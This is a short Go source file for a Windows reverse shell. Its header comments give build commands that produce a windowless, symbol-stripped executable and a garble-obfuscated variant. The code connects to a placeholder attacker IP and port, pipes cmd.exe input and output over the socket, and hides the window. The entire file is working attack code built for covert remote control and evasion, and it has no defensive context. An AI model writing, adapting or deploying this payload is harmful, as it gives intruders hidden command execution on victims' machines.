// Go Reverse Shell — garble-obfuscated ready
//
// Compiles with: GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o payload.exe go_payload.go
// Garble:         garble -tiny build -o payload_garble.exe go_payload.go
//
// Placeholders replaced at build time:
//   {{LHOST}}  — attacker IP (e.g. 192.168.1.100)
//   {{LPORT}}  — attacker port (e.g. 4444)

package main

import (
	"net"
	"os/exec"
	"syscall"
)

func main() {
	addr := "{{LHOST}}:{{LPORT}}"
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return
	}
	defer conn.Close()

	// Duplicate socket handle for stdin/stdout/stderr
	cmd := exec.Command("cmd.exe")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Hide the window
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	cmd.Run()
}
